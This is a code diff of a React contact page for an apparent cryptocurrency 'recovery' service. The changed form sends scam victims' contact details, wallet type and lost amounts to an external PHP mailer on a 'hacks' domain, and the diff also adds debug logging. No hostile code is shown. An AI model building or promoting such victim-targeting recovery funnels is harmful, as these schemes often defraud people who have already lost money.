@@ -85,12 +85,17 @@ export default function ContactPage() {
     if (Object.keys(validationErrors).length === 0) {
       setLoading(true);
       try {
-        const res = await fetch('/api/contact', {
+        // Call PHP script directly
+        const res = await fetch('https://neilbrinahacks.it.com/contact-mailer.php', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(form),
         });
+        
+        console.log('Response status:', res.status);
         const data = await res.json();
+        console.log('Response data:', data);
+        
         if (data.success) {
           setApiMessage({ type: 'success', text: 'Your message has been sent successfully!' });
           setForm({
@@ -109,6 +114,7 @@ export default function ContactPage() {
           setApiMessage({ type: 'error', text: data.error || 'Failed to send your message. Please try again.' });
         }
       } catch (error) {
+        console.error('Form submission error:', error);
         setApiMessage({ type: 'error', text: 'Failed to send your message. Please try again.' });
       } finally {
         setLoading(false);
@@ -147,34 +153,34 @@ export default function ContactPage() {
             <div className="flex gap-4">
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">First name</label>
-                <input name="firstName" type="text" className={`w-full border ${errors.firstName && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="First name" value={form.firstName} onChange={handleChange} />
+                <input name="firstName" type="text" className={`w-full border ${errors.firstName && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="First name" value={form.firstName} onChange={handleChange} />
                 {errors.firstName && submitted && <div className="text-red-500 text-sm mt-1">{errors.firstName}</div>}
               </div>
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">Last name</label>
-                <input name="lastName" type="text" className={`w-full border ${errors.lastName && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="Last name" value={form.lastName} onChange={handleChange} />
+                <input name="lastName" type="text" className={`w-full border ${errors.lastName && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="Last name" value={form.lastName} onChange={handleChange} />
                 {errors.lastName && submitted && <div className="text-red-500 text-sm mt-1">{errors.lastName}</div>}
               </div>
             </div>
             <div>
               <label className="block text-gray-700 font-semibold mb-1">Country</label>
-              <input name="country" type="text" className={`w-full border ${errors.country && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="Country" value={form.country} onChange={handleChange} />
+              <input name="country" type="text" className={`w-full border ${errors.country && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="Country" value={form.country} onChange={handleChange} />
               {errors.country && submitted && <div className="text-red-500 text-sm mt-1">{errors.country}</div>}
             </div>
             <div className="flex gap-4">
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">Email</label>
-                <input name="email" type="email" className={`w-full border ${errors.email && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="your@company.com" value={form.email} onChange={handleChange} />
+                <input name="email" type="email" className={`w-full border ${errors.email && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="your@company.com" value={form.email} onChange={handleChange} />
                 {errors.email && submitted && <div className="text-red-500 text-sm mt-1">{errors.email}</div>}
               </div>
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">Phone number</label>
-                <input name="phone" type="tel" className={`w-full border border-gray-200 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="+1 (555) 000-0000" value={form.phone} onChange={handleChange} />
+                <input name="phone" type="tel" className={`w-full border border-gray-200 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="+1 (555) 000-0000" value={form.phone} onChange={handleChange} />
               </div>
             </div>
             <div>
               <label className="block text-gray-700 font-semibold mb-1">Choose your recovery type</label>
-              <select name="recoveryType" className={`w-full border ${errors.recoveryType && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} value={form.recoveryType} onChange={handleChange}>
+              <select name="recoveryType" className={`w-full border ${errors.recoveryType && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} value={form.recoveryType} onChange={handleChange}>
                 <option className="text-gray-600" value="">Select one...</option>
                 <option>Password Recovery</option>
                 <option>Seed Phrase Recovery</option>
@@ -186,7 +192,7 @@ export default function ContactPage() {
             <div className="flex gap-4">
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">Wallet type</label>
-                <select name="walletType" className={`w-full border ${errors.walletType && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} value={form.walletType} onChange={handleChange}>
+                <select name="walletType" className={`w-full border ${errors.walletType && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} value={form.walletType} onChange={handleChange}>
                   <option className="text-gray-600" value="">Select one...</option>
                   <option>Bitcoin</option>
                   <option>Ethereum</option>
@@ -198,7 +204,7 @@ export default function ContactPage() {
               </div>
               <div className="flex-1">
                 <label className="block text-gray-700 font-semibold mb-1">Total lost amount</label>
-                <input name="lostAmount" type="number" className={`w-full border ${errors.lostAmount && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 ${darkPlaceholder}`} placeholder="Wallet Value/Total scammed Value" value={form.lostAmount} onChange={handleChange} />
+                <input name="lostAmount" type="number" className={`w-full border ${errors.lostAmount && submitted ? 'border-red-500' : 'border-gray-200'} rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-400 text-gray-900 ${darkPlaceholder}`} placeholder="Wallet Value/Total scammed Value" value={form.lostAmount} onChange={handleChange} />
                 {errors.lostAmount && submitted && <div className="text-red-500 text-sm mt-1">{errors.lostAmount}</div>}
               </div>
             </div>
